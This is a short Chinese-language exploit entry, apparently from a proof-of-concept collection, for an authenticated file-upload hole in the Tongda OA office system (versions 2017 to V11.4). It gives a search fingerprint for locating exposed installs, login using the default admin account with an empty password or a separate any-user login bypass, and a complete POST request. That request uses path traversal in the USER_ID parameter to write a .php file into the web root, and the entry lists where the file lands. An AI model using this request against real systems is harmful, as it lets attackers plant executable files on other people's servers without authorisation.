# 通达OAupdate存在后台文件上传漏洞

- **系统**：通达OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/1.php HTTP/1.1`

**请求体 / payload**
```
1、使用默认密码admin，密码为空或采用通达OA任意用户登录登录后台；\
2. 通过上一步获取的cookie上传文件
Cookie: {cookie}
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: {hostname}
Content-Length: 203
--00content0boundary00
Content-Disposition: form-data; name="ATTACHMENT"; filename="."
123
--00content0boundary00
Content-Disposition: form-data; name="submit"
保存
--00content0boundary00--

上传文件位置
/general/reportshop/workshop/report/attachment-remark/1.php
```

**其他**
- 通达OA update存在后台文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达2017-通达V11.4